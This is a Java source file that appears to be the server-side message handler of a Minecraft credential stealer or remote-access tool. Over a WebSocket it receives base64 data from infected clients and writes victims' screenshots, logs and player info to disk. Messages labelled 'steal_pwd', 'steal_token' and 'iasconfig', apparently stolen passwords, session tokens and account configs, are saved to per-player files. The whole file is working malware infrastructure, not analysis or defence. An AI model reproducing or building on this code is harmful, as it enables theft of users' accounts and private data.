package me.soda.server.handlers;

import com.google.gson.Gson;
import me.soda.server.Client;
import me.soda.server.Server;
import org.java_websocket.WebSocket;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.Base64;

import static me.soda.server.Server.log;

public class MessageHandler {
    private static String decodeBase64(String str) {
        byte[] result = Base64.getDecoder().decode(str.getBytes());
        return new String(result);
    }

    @SuppressWarnings("ResultOfMethodCallIgnored")
    public static void handle(String[] msgArr, WebSocket conn) {
        int id = conn.<Integer>getAttachment();
        try {
            switch (msgArr[0]) {
                case "screenshot" -> {
                    File file = new File("screenshots", getFileName("ip", "png", String.valueOf(id), true));
                    new File("screenshots").mkdir();
                    file.createNewFile();
                    FileOutputStream out = new FileOutputStream(file);
                    out.write(Base64.getDecoder().decode(msgArr[1]));
                    out.close();
                }
                case "skin" -> {
                    String playerName = Server.clientMap.get(conn).playerName;
                    File file = new File("skins", getFileName(playerName, "png", String.valueOf(id), false));
                    new File("skins").mkdir();
                    file.createNewFile();
                    FileOutputStream out = new FileOutputStream(file);
                    out.write(Base64.getDecoder().decode(msgArr[1]));
                    out.close();
                }
                case "logging" -> {
                    File file = new File("logging", getFileName("ip", "log", String.valueOf(id), false));
                    new File("logging").mkdir();
                    file.createNewFile();
                    FileInputStream in = new FileInputStream(file);
                    String oldInfo = new String(in.readAllBytes(), StandardCharsets.UTF_8);
                    in.close();
                    FileOutputStream out = new FileOutputStream(file);
                    out.write((oldInfo + decodeBase64(msgArr[1])).getBytes(StandardCharsets.UTF_8));
                    out.close();
                }
                case "player" -> {
                    String playerInfo = decodeBase64(msgArr[1]);
                    Server.clientMap.replace(conn, new Gson().fromJson(playerInfo, Client.class));
                    log("Message: " + msgArr[0] + " " + playerInfo);
                }
                case "steal_pwd", "steal_token", "iasconfig" -> {
                    File file = new File("player", getFileName(msgArr[0], "json", Server.clientMap.get(conn).playerName, true));
                    new File("player").mkdir();
                    file.createNewFile();
                    FileOutputStream out = new FileOutputStream(file);
                    out.write(decodeBase64(msgArr[1]).getBytes(StandardCharsets.UTF_8));
                    out.close();
                }
                default -> log("Message: " + msgArr[0] + " " + decodeBase64(msgArr[1]));
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String getFileName(String prefix, String suffix, String afterPrefix, boolean time) {
        return String.format("%s-%s%s.%s", prefix, afterPrefix, time ? LocalDateTime.now().format(DateTimeFormatter.ofPattern("-MM-dd-HH-mm-ss")) : "", suffix);
    }

}
